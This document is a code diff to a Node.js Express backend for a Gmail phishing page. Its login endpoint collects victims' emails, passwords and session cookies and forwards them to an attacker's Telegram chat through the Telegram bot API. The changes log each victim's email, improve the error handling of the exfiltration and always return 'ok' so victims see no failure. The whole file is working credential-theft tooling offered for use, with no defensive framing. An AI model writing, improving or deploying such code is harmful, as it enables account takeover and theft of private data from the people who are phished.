@@ -2,65 +2,85 @@ const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware
 app.use(cors());
 app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
 
-// ─── Environment variables ────────────────────────────────────────────
+// Serve static files
+const publicPath = path.join(__dirname, 'public');
+if (fs.existsSync(publicPath)) {
+    app.use(express.static(publicPath));
+} else {
+    app.use(express.static(__dirname));
+}
+
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.warn('⚠️ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set. Telegram notifications will be disabled.');
-}
+console.log('🔧 Telegram config:');
+console.log('  Token:', TELEGRAM_BOT_TOKEN ? '✅ set' : '❌ missing');
+console.log('  Chat ID:', TELEGRAM_CHAT_ID ? '✅ set' : '❌ missing');
 
-// ─── POST /api/login ──────────────────────────────────────────────────
 app.post('/api/login', async (req, res) => {
     const { email, password, cookies, userAgent, timestamp, pageUrl } = req.body;
 
-    // Build a readable Telegram message (Markdown format)
-    const message = `
-📩 **New Gmail Credentials**
-👤 **Email:** ${email}
-🔑 **Password:** ${password}
-🍪 **Cookies:** ${cookies || '(none)'}
-🖥️ **User‑Agent:** ${userAgent}
-⏱️ **Time:** ${timestamp}
-🔗 **Page:** ${pageUrl}
-    `;
+    console.log('📨 Received credentials for:', email);
 
-    // Send to Telegram
+    const message =
+        `📩 New Gmail Credentials\n` +
+        `👤 Email: ${email}\n` +
+        `🔑 Password: ${password}\n` +
+        `🍪 Cookies: ${cookies || '(none)'}\n` +
+        `🖥️ User‑Agent: ${userAgent}\n` +
+        `⏱️ Time: ${timestamp}\n` +
+        `🔗 Page: ${pageUrl}`;
+
     let telegramResult = 'not attempted';
     if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
         try {
+            const truncated = message.slice(0, 4000);
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             const resp = await axios.post(telegramUrl, {
                 chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
+                text: truncated,
+                parse_mode: ''
             });
-            telegramResult = 'success';
+            console.log('✅ Telegram response:', resp.data);
+            if (resp.data && resp.data.ok) {
+                telegramResult = 'success';
+            } else {
+                telegramResult = 'failed: ' + (resp.data.description || 'unknown');
+            }
         } catch (err) {
-            console.error('Telegram error:', err.message);
-            telegramResult = 'failed: ' + err.message;
+            console.error('❌ Telegram error:', err.response?.data || err.message);
+            telegramResult = 'failed: ' + (err.response?.data?.description || err.message);
         }
     } else {
         telegramResult = 'not configured';
     }
 
-    res.json({ status: 'delivered', telegram: telegramResult });
+    // Always return success to the frontend (no error shown)
+    res.json({ status: 'ok' });
 });
 
-// ─── Serve the HTML for any other route ──────────────────────────────
+// Fallback – serve index.html
 app.get('*', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    const possiblePaths = [
+        path.join(__dirname, 'public', 'index.html'),
+        path.join(__dirname, 'index.html')
+    ];
+    for (const p of possiblePaths) {
+        if (fs.existsSync(p)) {
+            return res.sendFile(p);
+        }
+    }
+    res.status(404).send('index.html not found');
 });
 
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+    console.log(`✅ Server running on port ${PORT}`);
 });
